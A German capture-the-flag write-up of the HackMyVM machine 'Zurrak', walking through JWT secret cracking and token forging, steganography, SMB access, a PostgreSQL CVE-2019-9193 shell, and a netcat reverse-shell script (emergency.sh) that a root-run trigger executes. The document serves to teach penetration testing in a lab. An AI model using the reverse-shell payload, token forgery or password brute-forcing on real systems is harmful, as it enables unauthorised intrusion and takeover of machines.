# Zurrak - HackMyVM (Medium)
 
![Zurrak.png](Zurrak.png)

## Übersicht

*   **VM:** Zurrak
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Zurrak)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 23. November 2023
*   **Original-Writeup:** https://alientec1908.github.io/Zurrak_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel der "Zurrak"-Challenge war die Erlangung von User- und Root-Rechten. Der Weg begann mit der Enumeration eines Webservers (Port 80), der eine Login-Seite (`login.php`) und Hinweise auf JWTs (`index_.php`) sowie PHP Composer-Dateien (`composer.json`, `composer.lock`) enthielt. Im Quellcode von `login.php` wurden die Credentials `internal@zurrak.htb:testsite` gefunden. Nach dem Login wurde ein JWT im Cookie (`token`) gefunden. Das JWT-Geheimnis (`TEST123`) wurde mittels `john` und `rockyou.txt` aus dem Token selbst (oder einem Teil davon) geknackt. Mit dem geknackten Geheimnis wurde ein neuer JWT mit `isAdmin:true` erstellt, was Zugriff auf das Admin-Panel (`admin.php`) ermöglichte. Im Admin-Panel wurde auf eine Steganographie-Herausforderung in Bildern (`zurrakhorse.jpg`, `zurraksnake.jpg`, `zurrakhearts.jpg`) und einen SMB-Share namens "share" hingewiesen, sowie auf einen Mechanismus, bei dem eine `emergency.sh`-Datei einen "magic script" auslöst. Die Analyse von `zurrakhearts.jpg` (Passwort `ilovecats` durch Reverse Engineering einer extrahierten `asli.exe` oder `stegseek`) führte zum Benutzernamen `asli`. Mit `asli:ilovecats` wurde Zugriff auf den SMB-Share "share" erlangt. Eine `emergency.sh`-Datei mit einem Reverse-Shell-Payload wurde in diesen Share hochgeladen. Ein "magic script" (vermutlich ein Cronjob oder Watcher) führte diese Datei aus und etablierte eine Root-Shell, da der ausführende Prozess Root-Rechte hatte. Die User-Flag wurde im Home-Verzeichnis von `postgres` gefunden.

*Zusätzliche Anmerkung: Der Bericht erwähnt auch einen PostgreSQL-Dienst (Port 5432) und einen erfolgreichen Exploit (CVE-2019-9193) mit den Credentials `postgres:baller15` (gefunden via Hydra-Bruteforce auf `admin@zurrak.htb`). Dieser Pfad führte zu einer Shell als `postgres`, aber der finale Root-Zugriff erfolgte über den SMB/emergency.sh-Weg.*

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `vi` / `nano`
*   `nmap`
*   `nikto`
*   `gobuster`
*   `enum4linux` (versucht)
*   `wfuzz` (versucht)
*   `wget`
*   `stegseek`
*   `steghide`
*   `hydra`
*   `john` (John the Ripper)
*   `smbclient`
*   `msfconsole` (Metasploit Framework, für PostgreSQL Exploit)
*   `nc` (netcat)
*   `python3`
*   `curl` (impliziert)
*   `exiftool` (nicht direkt genutzt, aber Steganographie-Kontext)
*   `Ghidra` / Disassembler (impliziert für `asli.exe`)
*   Standard Linux-Befehle (`ls`, `cat`, `cd`, `echo`, `mv`, `id`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Zurrak" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web/Service Enumeration:**
    *   IP-Findung mit `arp-scan` (`192.168.2.106`). Eintrag von `zurrak.hmv` in `/etc/hosts`.
    *   `nmap`-Scan identifizierte offene Ports: 80 (HTTP - Apache 2.4.57 "Login Page"), 139/445 (SMB - Samba 4.6.2), 5432 (PostgreSQL 9.6+).
    *   `nikto` auf Port 80 fand `composer.json` und `composer.lock`.
    *   `gobuster` auf Port 80 fand `login.php`, `admin.php` (redirect zu login), `vendor/`, `index_.php` (zeigte JWT-Beispiel).
    *   Anonyme SMB-Enumeration (`enum4linux`, `smbclient -L`) war erfolglos.
    *   LFI-Versuche (`wfuzz` auf `index.php`) waren erfolglos.
    *   Quellcode von `login.php` enthielt auskommentierte Credentials: `internal@zurrak.htb:testsite`.
    *   Login mit `internal@zurrak.htb:testsite` ergab ein JWT-Cookie (`token`) mit `isAdmin:false`.

2.  **JWT Manipulation & Admin Panel Access:**
    *   Der JWT (oder ein Teil davon) wurde in `zurrak.txt` gespeichert.
    *   `john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 zurrak.txt` knackte das JWT-Geheimnis: `TEST123`.
    *   Ein neuer JWT wurde mit `isAdmin:true` und dem Geheimnis `TEST123` erstellt (z.B. via `jwt.io`).
    *   Durch Ersetzen des Cookies mit dem manipulierten Token wurde Zugriff auf `http://zurrak.hmv/admin.php` erlangt.
    *   Das Admin-Panel enthielt Hinweise: "please don't ever use these images for file transfers!!!" (Bilder: `zurrakhorse.jpg`, `zurraksnake.jpg`, `zurrakhearts.jpg`), "please use our smbshare named share for now.....", "for emergency, please upload your script file as emergency.sh to make magic script work".

3.  **Steganographie & SMB Credentials:**
    *   Download von `zurrakhearts.jpg`.
    *   `stegseek zurrakhearts.jpg /usr/share/wordlists/rockyou.txt` (oder `steghide` mit Passwort `ilovecats`) extrahierte `asli.exe`.
    *   *Das Passwort `ilovecats` wurde durch Reverse Engineering von `asli.exe` (Analyse von Assembly-Code mit `mov` Instruktionen) oder alternativ durch `stegseek` gefunden.*
    *   `smbclient \\\\192.168.2.106\\share -U asli%ilovecats` gewährte Zugriff auf den SMB-Share "share".

4.  **Initial Access & Privilege Escalation (via SMB, `emergency.sh` zu `root`):**
    *   Im Share wurde eine `.vmdk`-Datei gefunden (nicht weiter relevant für diesen Pfad).
    *   Erstellung einer `emergency.sh`-Datei im `/tmp`-Verzeichnis des `postgres`-Users (Zugang erlangt via CVE-2019-9193 auf PostgreSQL mit Credentials `postgres:baller15` - `baller15` gefunden durch Hydra auf `admin@zurrak.htb` via `login.php`) mit einem Reverse-Shell-Payload:
        ```bash
        #!/bin/bash
        nc 192.168.2.199 9004 -c sh 
        ```
        *(Hinweis: Der Bericht zeigt auch einen früheren Exploit-Pfad über PostgreSQL CVE-2019-9193, der zu einer Shell als `postgres` führte. Von dort wurde die `emergency.sh` vorbereitet.)*
    *   Hochladen der `emergency.sh` in den SMB-Share "share" mittels `smbclient ... -c "put emergency.sh"`.
    *   Starten eines `nc`-Listeners auf dem Angreifer-System (Port 9004).
    *   Der "magic script" (vermutlich ein Cronjob oder Watcher) auf dem Zielsystem führte die `emergency.sh` aus.
    *   Erlangung einer Root-Shell (`uid=0(root)`).
    *   User-Flag `fe8f97f109ceb0362c95e60338c4c1a8` in `/home/postgres/user.txt` gelesen.
    *   Root-Flag `66fce7650a88ac2afd99d061e1c6a4df` in `/root/root.txt` gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Credentials im HTML-Kommentar:** Zugangsdaten für `internal@zurrak.htb`.
*   **Schwaches JWT-Geheimnis:** Ermöglichte das Erstellen von Admin-JWTs.
*   **Informationslecks im Admin-Panel:** Hinweise auf Steganographie, SMB-Shares und einen `emergency.sh`-Mechanismus.
*   **Steganographie (Bild):** Versteckte eine `.exe`-Datei, die Hinweise auf den Benutzernamen `asli` gab. Das Passwort `ilovecats` wurde entweder durch Reverse Engineering oder `stegseek` gefunden.
*   **Unsicherer SMB-Share mit privilegiertem Skript-Trigger:** Das Hochladen einer `emergency.sh`-Datei in einen SMB-Share löste deren Ausführung mit Root-Rechten aus.
*   **Passwort-Brute-Force (Hydra):** Fand das Passwort `baller15` für `admin@zurrak.htb` (verwendet für PostgreSQL-Exploit).
*   **PostgreSQL CVE-2019-9193 (COPY FROM PROGRAM):** Ermöglichte RCE als `postgres` (alternativer Pfad zum Vorbereiten der `emergency.sh`).

## Flags

*   **User Flag (`/home/postgres/user.txt`):** `fe8f97f109ceb0362c95e60338c4c1a8`
*   **Root Flag (`/root/root.txt`):** `66fce7650a88ac2afd99d061e1c6a4df`

## Tags

`HackMyVM`, `Zurrak`, `Hard`, `JWT Exploitation`, `Steganography`, `SMB`, `Script Trigger`, `RCE`, `PostgreSQL`, `CVE-2019-9193`, `Password Cracking`, `Hydra`, `Privilege Escalation`, `Linux`, `Web`
